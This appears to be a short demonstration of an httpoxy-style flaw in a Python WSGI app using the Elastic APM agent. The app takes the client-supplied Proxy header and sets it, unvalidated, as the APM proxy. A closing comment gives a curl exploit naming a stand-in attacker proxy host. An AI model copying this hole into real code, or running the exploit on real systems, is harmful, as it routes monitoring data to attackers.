# Importing the Elastic APM agent for Python
from elasticapm import Client

# Initialize the Elastic APM client
apm_client = Client(service_name='my_service')

# Define a function to handle HTTP requests
def handle_request(environ, start_response):
    # Get the proxy header from the request
    proxy_header = environ.get('HTTP_PROXY')

    # If the proxy header is set, use it to redirect APM data
    if proxy_header:
        # Vulnerable code: using the proxy header directly without validation
        apm_client.config.proxy = proxy_header

    # Handle the request and send the response
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return ['Hello, World!']

# Run the application
if __name__ == '__main__':
    from wsgiref.simple_server import make_server
    server = make_server('localhost', 8000, handle_request)
    server.serve_forever()

# To exploit:
# curl -X GET http://localhost:8000/ -H 'Proxy: http://attacker-proxy.com:8080'